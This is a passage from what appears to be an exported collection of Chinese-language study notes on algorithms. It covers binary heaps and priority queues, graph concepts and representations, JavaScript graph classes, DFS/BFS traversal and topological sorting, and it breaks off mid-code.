的方式存储\n2、需要维护每个节点的关系，即大于或者小于它的两个子节点，所以有`上浮`和`下沉` 两个操作\n3、关于循环，使用 while 或者 递归，比如一直`下沉`到具体什么条件，即递归。\n\n## 2. 二叉堆与优先级队列的关系\n\n**优先级队列**这种数据结构，在`插入或者删除`元素的时候，元素会`自动排序`，这底层的原理就是`二叉堆`的操作，==就是这关系而已。== \n\n但真正在一些算法题里，不可能单独还在实现一个二叉堆的数据结构，所以往往只是实现部分逻辑，甚至都不采用这种堆数据结构，完全独立实现。如 合并 K 个有序链表 中的 **优先级入队函数**，其实和`二叉堆`没有什么区别。\n\n```javascript\n// 优先级队列，值最小的先入队，即优先级最高\nlet q = [];\n// 优先队列的【入队函数】，值最小的先入队列\nlet enqueue = (node) => {\n\tif (q.length === 0) {\n\t\tq.push(node);\n\t} else {\n\t\t// 是否插入了\n\t\tlet added = false;\n\t\tfor (let i = 0; i < q.length; i++) {\n\t\t\tif (node.val < q[i].val) {\n\t\t\t\tq.splice(i, 0, node)\n\t\t\t\tadded = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\t// 没找到合适的插入位置，则添加到末尾\n\t\tif (!added) {\n\t\t\tq.push(node);\n\t\t}\n\t}\n}\n```\n\n> 当然，还是因为 `JavaScript` 没有对应的公共数据结构库，**Leetcode 专门提供了专门的库，记得使用，别自己实现**。对应 Java 就有 `PriorityQueue`\n\n## 3. 总结\n\n- `二叉堆`就是一种 `完全二叉树`，所以适合存储在`数组`中，而且二叉堆拥有一些特殊性质。\n- 二叉堆的操作很简单，主要就是 `上浮和下沉`，来维护堆的性质（`堆有序`）\n- **优先级队列**是基于`二叉堆`实现的，主要操作是`插入和删除`。\n\t- 插入是**先插到最后**，然后**上浮到正确位置**\n\t- 删除是 **调换位置后再删除**，然后**下沉**到正确位置\n\n","VOKmNFV9":"\n# 图结构篇\n\n\n`#2024/08/11` `#算法` `#数据结构` \n\n\n","HAOhannF":"\n# 图的基本概念\n\n`#图` `#数据结构/图`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 链表、树、图之间的关系 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240918222145.png)\n\n三种关系\n- 线性关系：链表\n- 分治关系：二叉树\n- 网络关系：图\n\n## 2. 有向图和无向图\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240918222229.png)\n\n## 3. 连通图和非连通图\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240918222332.png)\n\n## 4. 有权图和无权图\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240918222352.png)\n\n## 5. 图的表示： 邻接矩阵\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240918222447.png)\n\n## 6. 图的表示： 邻接表\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240918222518.png)\n\n## 7. 图的使用场景\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240923061833.png)\n","FCAb78wk":"\n# 图的实现：JavaScript 描述\n\n`#2024/09/15` `#算法` `#算法/图` \n\n\n## 目录\n<!-- toc -->\n ## 1. 基本概念  \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915080005.png)\n\n> 上图中，概括了图最基本的概念\n\n## 2. 图与树的区别\n\n- 在**树结构**中，只允许父节点指向子节点，不存在子节点指向父节点的情况，子节点之间也不会互相链接；\n- 而**图**中没有那么多限制，节点之间可以**相互指向**，形成复杂的网络结构。\n\n## 3. 图的表示方式：邻接表 +  邻接矩阵\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915081034.png)\n\n### 3.1. 节点类型不是 number，而是其他复杂类型怎么办？\n\n很简单，使用哈希\n- id 做 key \n- value 为其他复杂数据结构\n\n### 3.2. 两种存储方式的区别\n\n#### 3.2.1. 复杂度不同\n\n对于一幅有 `V` 个节点，`E` 条边的图\n- 邻接表的空间复杂度是 `O(V + E)`\n- 邻接矩阵的空间复杂度是 `O(V^2)`。\n\n所以如果一幅图的 `E` 远小于 `V^2`（**稀疏图**），那么邻接表会比邻接矩阵节省空间，反之，如果 `E` 接近 `V^2`（稠密图），二者就差不多了。\n\n#### 3.2.2. 邻接矩阵是**数学的矩阵** \n\n邻接矩阵的最大优势在于，**矩阵是一个强有力的数学工具**，图的一些隐晦性质可以借助精妙的矩阵运算展现出来。\n\n## 4. 有向加权图\n\n- 如果是邻接表表示\n\t- 不仅仅存储某个节点 `x` 的所有邻居节点\n\t- 还存储 `x` 到每个邻居的权重\n- 如果是邻接矩阵，`matrix[x][y]` 不再是布尔值，而是一个 int 值\n\t- 0 表示没有连接\n\t- 其他值（非 0）表示权重\n\n```javascript\n// 邻接表\n// graph[x] 存储 x 的所有邻居节点以及对应的权重\nfunction Edge(to, weight) {\n    this.to = to;\n    this.weight = weight;\n}\n// 注意 Edge\nvar graph: Edge[][] = [];\n\n// 邻接矩阵\n// matrix[x][y] 记录 x 指向 y 的边的权重，0 表示不相邻\nvar matrix: number[][] = [];\n```\n\n## 5. 无向图\n\n所谓**无向**，即**双向**，如下图：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915082052.png)\n\n- 邻接矩阵表示无向图：如果连接无向图中的节点 `x` 和 `y`，把 `matrix[x][y]` 和 `matrix[y][x]` 都变成 `true` 不就行了；\n- 邻接表表示无向图：\n\t- 在 `x` 的邻居列表里添加 `y`\n\t- 同时在 `y` 的邻居列表里添加 `x`\n\n## 6. 图 Graph 类定义\n\n### 6.1. Graph 框架\n\n```javascript\nclass Graph {\n  /**\n   * @description 添加一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   * @param {number} weight 权重\n   */\n  addEdge(from, to, weight) {}\n\n  /**\n   * @description 移除一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  removeEdge(from, to) {}\n\n  /**\n   * @description 判断是否有某条边,即是否有从 from 到 to 的边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  hasEdge(from, to) {}\n\n  /**\n   * @description 获取某条边的权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  weight(from, to) {}\n\n  /**\n   * @description 获取某个节点的所有邻居节点和对应权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  neighbors(v) {}\n\n  // 返回节点总数\n  size() {}\n}\n\n```\n\n### 6.2. 有向加权图（邻接表实现）\n\n```javascript\n// 有向加权图（邻接表实现）\nclass Graph {\n  // 存储相邻节点及边的权重\n  // n 为节点数量\n  constructor(n) {\n    this.graph = Array.from({ length: n }, () => []);\n  }\n\n  /**\n   * @description 添加一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   * @param {number} weight 权重\n   */\n  addEdge(from, to, weight) {\n    this.graph[from].push({ node: to, weight });\n  }\n\n  /**\n   * @description 移除一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  removeEdge(from, to) {\n    this.graph[from] = this.graph[from].filter((edge) => edge.node !== to);\n  }\n\n  /**\n   * @description 判断是否有某条边,即是否有从 from 到 to 的边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  hasEdge(from, to) {\n    return this.graph[from].some((edge) => edge.node === to);\n  }\n\n  /**\n   * @description 获取某条边的权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  weight(from, to) {\n    return this.graph[from].find((edge) => edge.node === to)?.weight;\n  }\n\n  /**\n   * @description 获取某个节点的所有邻居节点和对应权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  neighbors(v) {\n    return this.graph[v];\n  }\n\n  // 返回节点总数\n  size() {\n    return this.graph.length;\n  }\n}\n\n```\n\n### 6.3. 有向加权图（邻接矩阵实现）\n\n```javascript\n// 有向加权图（邻接矩阵实现）\nclass Graph {\n  // n 为节点数量\n  constructor(n) {\n    // init matrix\n    this.matrix = Array.from({ length: n }, () =>\n      Array.from({ length: n }, () => 0),\n    );\n  }\n\n  /**\n   * @description 添加一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   * @param {number} weight 权重\n   */\n  addEdge(from, to, weight) {\n    this.matrix[from][to] = weight;\n  }\n\n  /**\n   * @description 移除一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  removeEdge(from, to) {\n    this.matrix[from][to] = 0;\n  }\n\n  /**\n   * @description 判断是否有某条边,即是否有从 from 到 to 的边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  hasEdge(from, to) {\n    return this.matrix[from][to] > 0;\n  }\n\n  /**\n   * @description 获取某条边的权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  weight(from, to) {\n    return this.matrix[from][to];\n  }\n\n  /**\n   * @description 获取某个节点的所有邻居节点和对应权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  neighbors(v) {\n    const res = [];\n    for (let i = 0; i < this.matrix[v].length; i++) {\n      if (this.matrix[v][i] > 0) {\n        res.push({ node: i, weight: this.matrix[v][i] });\n      }\n    }\n    return res;\n  }\n\n  // 返回节点总数\n  size() {\n    return this.matrix.length;\n  }\n}\n\n```\n\n### 6.4. 无向加权图（邻接表实现）\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240923063420.png)\n\n基于 [#有向加权图（邻接表实现）](/post/FCAb78wk.html#有向加权图（邻接表实现）) 只需要添加以下两行代码即可\n\n```javascript hl:17,27\n// 无向加权图（邻接表实现）\nclass Graph {\n  // 存储相邻节点及边的权重\n  // n 为节点数量\n  constructor(n) {\n    this.graph = Array.from({ length: n }, () => []);\n  }\n\n  /**\n   * @description 添加一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   * @param {number} weight 权重\n   */\n  addEdge(from, to, weight) {\n    this.graph[from].push({ node: to, weight });\n    this.graph[to].push({ node: from, weight });\n  }\n\n  /**\n   * @description 移除一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  removeEdge(from, to) {\n    this.graph[from] = this.graph[from].filter((edge) => edge.node !== to);\n    this.graph[to] = this.graph[to].filter((edge) => edge.node !== from);\n  }\n\n  /**\n   * @description 判断是否有某条边,即是否有从 from 到 to 的边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  hasEdge(from, to) {\n    return this.graph[from].some((edge) => edge.node === to);\n  }\n\n  /**\n   * @description 获取某条边的权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  weight(from, to) {\n    return this.graph[from].find((edge) => edge.node === to)?.weight;\n  }\n\n  /**\n   * @description 获取某个节点的所有邻居节点和对应权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  neighbors(v) {\n    return this.graph[v];\n  }\n\n  // 返回节点总数\n  size() {\n    return this.graph.length;\n  }\n}\n\n```\n\n### 6.5. 无向加权图（邻接矩阵实现）\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240923063024.png)\n\n在 [#6.3. 有向加权图（邻接矩阵实现）](/post/FCAb78wk.html#63-有向加权图（邻接矩阵实现）)中添加两行代码即可，如下：\n\n```javascript hl:19,29\n// 无向加权图（邻接矩阵实现）\nclass Graph {\n  // n 为节点数量\n  constructor(n) {\n    // init matrix\n    this.matrix = Array.from({ length: n }, () =>\n      Array.from({ length: n }, () => 0),\n    );\n  }\n\n  /**\n   * @description 添加一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   * @param {number} weight 权重\n   */\n  addEdge(from, to, weight) {\n    this.matrix[from][to] = weight;\n    this.matrix[to][from] = weight;\n  }\n\n  /**\n   * @description 移除一条边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  removeEdge(from, to) {\n    this.matrix[from][to] = 0;\n    this.matrix[to][from] = 0;\n  }\n\n  /**\n   * @description 判断是否有某条边,即是否有从 from 到 to 的边\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  hasEdge(from, to) {\n    return this.matrix[from][to] > 0;\n  }\n\n  /**\n   * @description 获取某条边的权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  weight(from, to) {\n    return this.matrix[from][to];\n  }\n\n  /**\n   * @description 获取某个节点的所有邻居节点和对应权重\n   * @param {string} from 起始节点\n   * @param {string} to 目标节点\n   */\n  neighbors(v) {\n    const res = [];\n    for (let i = 0; i < this.matrix[v].length; i++) {\n      if (this.matrix[v][i] > 0) {\n        res.push({ node: i, weight: this.matrix[v][i] });\n      }\n    }\n    return res;\n  }\n\n  // 返回节点总数\n  size() {\n    return this.matrix.length;\n  }\n}\n\n```\n\n## 7. 参考\n\n- https://labuladong.online/algo/data-structure-basic/graph-basic/\n- https://labuladong.online/algo/data-structure-basic/graph-traverse-basic/\n\n","BUrArfcI":"\n# 图的两种遍历方式：DFS 和 BFS\n\n`#2024/09/15` `#算法` `#算法/图`  `#图DFS` `#图BFS`  \n\n---\n\n图的遍历就是 [多叉树遍历](https://labuladong.online/algo/data-structure-basic/n-ary-tree-traverse-basic/) 的延伸。主要的遍历方式还是深度优先搜索（DFS）和广度优先搜索（BFS）。唯一的区别是，树结构中不存在环，而图结构中可能存在环，所以我们需要标记遍历过的节点，避免遍历函数在环中死循环。\n\n具体来说，遍历图的所有「节点」时，需要 `visited` 数组在前序位置标记节点；\n\n如果题目说这幅图不存在环，那么图的遍历就完全等同于多叉树的遍历。\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- **图**的遍历还是**多叉树**的延伸，只不过多了一个  `visited` 数组\n- 遍历图的所有「路径」时，需要 `onPath` 数组在**前序位置**标记节点，在**后序位置**撤销标记\n\n## 2. DFS 遍历\n\n### 2.1. DFS 遍历图的所有节点：使用 visited\n\n对比多叉树的遍历，很快能理解，如下\n\n#### 2.1.1. 多叉树与图的 DFS 遍历区别\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915191951.png)\n\n#### 2.1.2. 复杂度分析\n\n为什么图的深度优先搜索（DFS）遍历的时间复杂度是 `O(E + V)`， 其中 `E` 是边的数量，`V` 是顶点的数量。\n\n1. 遍历所有顶点：O(V)\n\t- 在DFS中，我们需要访问每个顶点至少一次。\n2. 探索所有边：O(E)\n\t- 对于每个顶点，我们需要探索与之相连的所有边。\n\t- 在整个过程中，每条边最多被考虑两次（对于无向图）或一次（对于有向图）\n\t- 因此，探索所有边需要 `O(E)` 的时间。\n3. 合并复杂度\n\t- 将这两部分组合起来，我们得到总的时间复杂度为 `O(V + E)`。\n4. 对于**邻接表**表示的图\n   - 访问每个顶点：O(V)\n   - 对于每个顶点，我们遍历其邻接列表。所有邻接列表的总长度等于边的数量（对于无向图是`2E`，对于有向图是`E`）。因此，遍历所有邻接列表的总时间是 `O(E)`。\n- 对于**邻接矩阵**表示的图\n   - 访问每个顶点：O(V)\n   - 对于每个顶点，我们需要检查它与所有其他顶点是否相连，这需要 O(V) 时间。\n   - 总的时间复杂度是 **O(V^2)**，但是我们通常表示为 **O(V + E)**，因为在最坏的情况下（完全图），E = V^2。\n\n#### 2.1.3. 为什么不是 `O(V * E)`？\n\n您可能会想，为什么不是 O(V * E)，因为我们似乎对每个顶点都要检查所有边。实际上，DFS 不会对每个顶点都检查所有边。每条边只会被检查有限次（通常是一次或两次），而不是 V 次。\n\n> 因为有 `visited 数组`\n\n#### 2.1.4. 多叉树的复杂度为什么是 `O(N)`，不算边的数量？\n\n- 其实二叉树/多叉树的遍历函数，也要算上边的数量，只不过对于树结构来说，边的数量和节点的数量是近似相等的，所以时间复杂度还是 `O(N + N) = O(N)`。\n\n### 2.2. 遍历所有的路径：使用 onPath\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915202726.png)\n\n---\n\n\n```js hl:15,16,24,33\n/**\n * @description 遍历图的所有路径\n * @param {*} graph 图结构，使用邻接表实现\n * @param {*} src 起始节点，即遍历的起点\n * @param {*} dest 目标节点，即遍历的终点\n * @returns 打印所有的路径\n */\nfunction traverseAllPath(graph, src, dest) {\n  // onPath 数组用于记录正在遍历的节点是否已经在路径上，避免成环\n  var onPath = new Array(graph.size()).fill(false);\n  // path 数组用于记录遍历所有的路径\n  var path = [];\n  var traverse = function (graph, src, dest) {\n    // base case：\n    // src < 0 说明节点编号不合法\n    // src >= graph.size() 说明节点编号不合法\n    if (src < 0 || src >= graph.size()) {\n      return;\n    }\n    // 防止死循环（成环），说明当前节点已经在路径上\n    if (onPath[src]) {\n      return;\n    }\n    // 前序位置:更新onpath 和 src\n    onPath[src] = true;\n    path.push(src);\n    if (src === dest) {\n      console.log(\"find path: \" + path);\n    }\n    for (var e of graph.neighbors(src)) {\n      traverse(graph, e.to, dest);\n    }\n    // 后序位置:回溯\n    path.pop();\n    onPath[src] = false;\n  };\n\n  traverse(graph, src, dest);\n\n  return path;\n}\n```\n\n### 2.3. 剪枝：同时利用 `visited` 和 `onPath` \n\n后面有习题需要同时利用 `visited` 和 `onPath` 数组来进行**剪枝**优化复杂度\n\n## 3. BFS 遍历\n\n- BFS 算法一般只用来寻找那条**最短路径**，不会用来求**所有路径**\n-  BFS 算法一层一层向四周扩散的逻辑，第一次遇到目标节点，必然就是**最短路径**\n\n### 3.1. 多叉树的层次遍历与图的 BFS 遍历对比：不记录步数\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915203402.png)\n\n### 3.2. 多叉树的层次遍历与图的 BFS 遍历对比：记录步数\n\n> 下面的图是**无权图**\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915204210.png)\n\n### 3.3. 多叉树的层次遍历与有向图的 BFS 遍历对比：记录步数\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240915205022.png)\n\n## 4. 参考\n\nhttps://labuladong.online/algo/data-structure-basic/graph-traverse-basic/\n","VP30teBT":"\n# 图数据结构\n\n\n# 图论基础\n\n\n## 目录\n<!-- toc -->\n ## 基本概念 \n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/611712fb7e1b34b66e3e0188ead2ff46.png)\n\n- 顶点：\n- 边：\n- 相邻顶点\n- 路径：\n- 度：相邻顶点的个数\n   - **入度**：顶点的入度是指「`**指向该顶点的边**`」的数量；\n   - **出度**：顶点的出度是指 `**该顶点指向其他点的边**`** **的数量。\n- 环：比如ACDA\n- 联通的：如果图中任何两个顶点都存在路径，那么他是联通的\n- 有向图：如下图\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/3b293445907f9016da14531e019173fc.png)\n\n- 强连通：比如上图的CD，双向都存在路径\n- 无向图：\n- 加权图：边赋予权值\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/71ecf6cea14bb69f43cebede23923670.png)\n\n## 图的表示\n\n### 邻接矩阵\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/935ee7a441340946e2456b1230365ca5.png)\n\n- 比较浪费空间\n- 二维数组不够灵活\n\n### 邻接表\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/082956fbb913d9e6d99640f1442970d6.png)\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/766d5b7b869e04a2a86cb81f55cef3fa.png)\n\n如上图，完全可是使用一个`**二维数组**`来标识，`graph = [4,3,1],[3,2,4],[3],[](/post/VP30teBT.html#4,3,1],[3,2,4],[3],[)`\n\n邻接表比较常用了，下面的代码使用`**字典**`来实现：\n```javascript\nimport Dictionary from './dictionary';\n\nexport default class Graph {\n  constructor(isDirected = false) {\n    // 表示图是否有向\n    this.isDirected = isDirected;\n    // 用一个数组来存储图中所有顶点的名字\n    this.vertices = [];\n    // 字典将会使用顶点的名字作为键，邻接顶点列表作为值\n    this.adjList = new Map();\n  }\n\n  addVertex(v) {\n    if (!this.vertices.includes(v)) {\n      this.vertices.push(v);\n      this.adjList.set(v, []); // initialize adjacency list with array as well;\n    }\n  }\n\n  addEdge(a, b) {\n    if (!this.adjList.get(a)) {\n      this.addVertex(a);\n    }\n    if (!this.adjList.get(b)) {\n      this.addVertex(b);\n    }\n    this.adjList.get(a).push(b);\n    if (this.isDirected !== true) {\n      this.adjList.get(b).push(a);\n    }\n  }\n\n  getVertices() {\n    return this.vertices;\n  }\n\n  getAdjList() {\n    return this.adjList;\n  }\n\n  toString() {\n    let s = '';\n    for (let i = 0; i < this.vertices.length; i++) {\n      s += `${this.vertices[i]} -> `;\n      const neighbors = this.adjList.get(this.vertices[i]);\n      for (let j = 0; j < neighbors.length; j++) {\n        s += `${neighbors[j]} `;\n      }\n      s += '\\n';\n    }\n    return s;\n  }\n}\n```\n\n### 关联矩阵\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/12dcfa6fc439e4b1e116d63f4ed4360c.png)\n\n\n# 图的遍历\n\n\n```javascript\nconst Colors = {\n  WHITE: 0, // 表示该顶点还没有被访问。\n  GREY: 1, //  表示该顶点被访问过，但并未被探索过\n  BLACK: 2 //  表示该顶点被访问过且被完全探索过\n};\n\n\nconst initializeColor = vertices => {\n  const color = {};\n  for (let i = 0; i < vertices.length; i++) {\n    color[vertices[i]] = Colors.WHITE;\n  }\n  return color;\n};\n\nconst depthFirstSearchVisit = (u, color, adjList, callback) => {\n  // (1) 标注 v 为被发现的(灰色);\n  color[u] = Colors.GREY;\n  if (callback) {\n    callback(u);\n  }\n  // (2) 对于 v 的所有未访问(白色)的邻点 w，访问顶点 w;\n  const neighbors = adjList.get(u);\n  for (let i = 0; i < neighbors.length; i++) {\n    const w = neighbors[i];\n    // 如果它的邻接点还没访问过，那么递归调用\n    if (color[w] === Colors.WHITE) {\n      depthFirstSearchVisit(w, color, adjList, callback);\n    }\n  }\n  // (3) 标注 v 为已被探索的(黑色)\n  color[u] = Colors.BLACK;\n};\n\nexport const depthFirstSearch = (graph, callback) => {\n  const vertices = graph.getVertices();\n  const adjList = graph.getAdjList();\n  const color = initializeColor(vertices);\n\n  for (let i = 0; i < vertices.length; i++) {\n    // 遍历所有顶点，如果该顶点没有访问，则访问这个顶点\n    if (color[vertices[i]] === Colors.WHITE) {\n      depthFirstSearchVisit(vertices[i], color, adjList, callback);\n    }\n  }\n};\n\n// 测试\nlet graph = new Graph(true);\n\nlet myVertices = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I'];\n\nfor (let i = 0; i < myVertices.length; i++) {\n  graph.addVertex(myVertices[i]);\n}\ngraph.addEdge('A', 'B');\ngraph.addEdge('A', 'C');\ngraph.addEdge('A', 'D');\ngraph.addEdge('C', 'D');\ngraph.addEdge('C', 'G');\ngraph.addEdge('D', 'G');\ngraph.addEdge('D', 'H');\ngraph.addEdge('B', 'E');\ngraph.addEdge('B', 'F');\ngraph.addEdge('E', 'I');\n\nconst printVertex = value => console.log('Visited vertex: ' + value);\n\ndepthFirstSearch(graph, printVertex);\n\n```\n\n以上是深度优先搜索算法的工作原理，下面把所有访问顶点点`**标记计数**`\n\n```javascript\n\nconst DFSVisit = (u, color, d, f, p, time, adjList) => {\n  color[u] = Colors.GREY;\n  d[u] = ++time.count;\n  const neighbors = adjList.get(u);\n  for (let i = 0; i < neighbors.length; i++) {\n    const w = neighbors[i];\n    if (color[w] === Colors.WHITE) {\n      p[w] = u;\n      DFSVisit(w, color, d, f, p, time, adjList);\n    }\n  }\n  color[u] = Colors.BLACK;\n  f[u] = ++time.count;\n\n};\n\nexport const DFS = graph => {\n  const vertices = graph.getVertices();\n  const adjList = graph.getAdjList();\n  const color = initializeColor(vertices);\n\n  // 顶点的发现时间\n  const d = {};\n  // 顶点的探索时间\n  const f = {};\n  // 顶点的前溯点\n  const p = {};\n\n  const time = {count: 0};\n\n  for (let i = 0; i < vertices.length; i++) {\n    f[vertices[i]] = 0;\n    d[vertices[i]] = 0;\n    p[vertices[i]] = null;\n  }\n\n  for (let i = 0; i < vertices.length; i++) {\n    if (color[vertices[i]] === Colors.WHITE) {\n      DFSVisit(vertices[i], color, d, f, p, time, adjList);\n    }\n  }\n\n  return {\n    discovery: d,\n    finished: f,\n    predecessors: p\n  };\n};\n\ngraph = new Graph(true); // directed graph\n\nmyVertices = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I'];\n\nfor (let i = 0; i < myVertices.length; i++) {\n  graph.addVertex(myVertices[i]);\n}\ngraph.addEdge('A', 'B');\ngraph.addEdge('A', 'C');\ngraph.addEdge('A', 'D');\ngraph.addEdge('C', 'D');\ngraph.addEdge('C', 'G');\ngraph.addEdge('D', 'G');\ngraph.addEdge('D', 'H');\ngraph.addEdge('B', 'E');\ngraph.addEdge('B', 'F');\ngraph.addEdge('E', 'I');\n\nconst result = DFS(graph);\nconsole.log('discovery', result.discovery);\nconsole.log('finished', result.finished);\nconsole.log('predecessors', result.predecessors);\n\n```\n\n如下图：能得出以下公式\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/e384ff31a02f020b816ff902d52feee0.png)\n\n那么以上原理方法有什么用呢？\n\n## 拓扑排序的深度优先实现方法\n注意：只能应用于`有向无环图` \n\n- 如果这个图不是 DAG，那么它是没有拓扑序的；\n- 如果是 DAG，那么它至少有一个拓扑序；\n- 反之，如果它存在一个拓扑序，那么这个图必定是 DGA.\n\n**应用场景：**\n\n- 比如，每天早上起床后穿衣的过程可以分为很多步骤，例如，**穿内裤，穿裤子，穿内裤**必须在穿裤子之前，同样的**穿袜子**必须在**穿鞋子**之前等等，**戴手表**和其它的任何一个动作之间都没有明显的关系，因此放在这个线性序列中的哪里都无所谓\n- 又比如，大学上课，一些课程有先后依赖关系\n\n如下图：\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/90c6be9d9c85ccc31caa1101bf2fb968.png)\n**使用深度优先遍历，即可得到下图，加上访问和探索的次数**\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/a9f65603508fb56868f853f62bc3b030.png)\n\n```javascript\n\nlet graph = new Graph(true); // 有向图\nlet myVertices = ['A', 'B', 'C', 'D', 'E', 'F'];\nfor (i = 0; i < myVertices.length; i++) {\n  graph.addVertex(myVertices[i]);\n}\ngraph.addEdge('A', 'C');\ngraph.addEdge('A', 'D');\ngraph.addEdge('B', 'D');\ngraph.addEdge('B', 'E');\ngraph.addEdge('C', 'F');\ngraph.addEdge('F', 'E');\nconst result = DFS(graph);\n\n// 现在要做的仅仅是以倒序来排序完成时间数组，这便得出了该图的拓扑排序\nconst fTimes = result.finished;\nlet s = '';\nfor (let count = 0; count < myVertices.length; count++) {\n  let max = 0;\n  let maxName = null;\n  for (i = 0; i < myVertices.length; i++) {\n    if (fTimes[myVertices[i]] > max) {\n      max = fTimes[myVertices[i]];\n      maxName = myVertices[i];\n    }\n  }\n  s += ' - ' + maxName;\n  delete fTimes[maxName];\n}\nconsole.log(s); //  - B - A - D - C - F - E \n```\n\t\t \t\t\t\t\n> 注意之前的拓扑排序结果**仅是多种可能性之一，比如**` A-B-C-D-F-E` 也是可以的。\n\n\n\n## 拓扑排序的广度优先实现方法\n可参考动图：[https://leetcode.cn/problems/course-schedule-ii/solution/ke-cheng-biao-ii-by-leetcode-solution/](https://leetcode.cn/problems/course-schedule-ii/solution/ke-cheng-biao-ii-by-leetcode-solution/)\n同样如下图：\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/90c6be9d9c85ccc31caa1101bf2fb968.png)\n```javascript\n// 有向图\nclass Graph {\n  constructor() {\n    // 用一个数组来存储图中所有顶点的名字\n    this.vertices = [];\n    // 所有顶点的入度\n    this.inDegree = new Map();\n    // 所有顶点的出度\n    this.outDegree = new Map();\n  }\n\n  addVertex(v) {\n    if (!this.vertices.includes(v)) {\n      this.vertices.push(v);\n      this.inDegree.set(v, []);\n      this.outDegree.set(v, []);\n    }\n  }\n\n  addEdge(a, b) {\n    if (!this.inDegree.get(a)) {\n      this.addVertex(a);\n    }\n    if (!this.inDegree.get(b)) {\n      this.addVertex(b);\n    }\n    this.outDegree.get(a).push(b);\n    this.inDegree.get(b).push(a);\n  }\n\n  getOutDegree = () => {\n    return this.outDegree;\n  }\n  getInDegree = () => {\n    return this.inDegree;\n  }\n\n\n}\n\nconst graph = new Graph(true); // 有向图\nconst myVertices = ['A', 'B', 'C', 'D', 'E', 'F'];\nfor (let i = 0; i < myVertices.length; i++) {\n  graph.addVertex(myVertices[i]);\n}\ngraph.addEdge('A', 'C');\ngraph.addEdge('A', 'D');\ngraph.addEdge('B', 'D');\ngraph.addEdge('B', 'E');\ngraph.addEdge('C', 'F');\ngraph.addEdge('F', 'E');\n\n\n// 拓扑排序\nconst sort = (graph) => {\n  // 获取邻接点字典\n  const inDegreeMap = graph.getInDegree();\n  const outDegreeMap = graph.getOutDegree();\n  // 